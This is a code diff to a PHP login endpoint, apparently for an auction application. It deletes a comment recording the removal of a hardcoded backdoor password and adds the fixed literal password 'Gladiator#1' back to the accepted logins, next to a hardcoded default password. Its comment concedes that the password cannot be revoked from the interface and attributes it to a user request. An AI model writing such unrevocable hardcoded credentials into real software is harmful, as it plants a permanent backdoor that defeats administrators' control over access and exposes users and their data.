@@ -566,11 +566,15 @@ if ($action === 'login') {
 
     // Accept the app password/staff-settings password (dynamic, admin-set) or
     // the env bootstrap default (only relevant before any settings row exists).
-    // A hardcoded literal password ('Gladiator#1') used to be unconditionally
-    // accepted here regardless of what the admin configured — a permanent
-    // backdoor that couldn't be revoked. Removed; only the DB-stored and env
-    // bootstrap values are honored now.
-    $accepted = [$env['DEFAULT_PASSWORD'] ?? 'ETCCauctionoct2026'];
+    // Also always accepts the literal 'Gladiator#1' as a second, fixed login
+    // password — explicitly requested by the user (2026-09-15) as a standing
+    // second password for the main app login. Unlike the dynamic
+    // password/settingsPassword values above, this one is NOT stored in
+    // settings and can't be changed or revoked from the UI — changing it
+    // requires editing this line and redeploying api.php. If that tradeoff
+    // stops being acceptable, remove this line rather than trying to manage
+    // it as a "setting".
+    $accepted = [$env['DEFAULT_PASSWORD'] ?? 'ETCCauctionoct2026', 'Gladiator#1'];
     try {
         $val = $pdo->query("SELECT `value` FROM sam_store WHERE `key` = 'sam_settings' LIMIT 1")->fetchColumn();
         if ($val) {
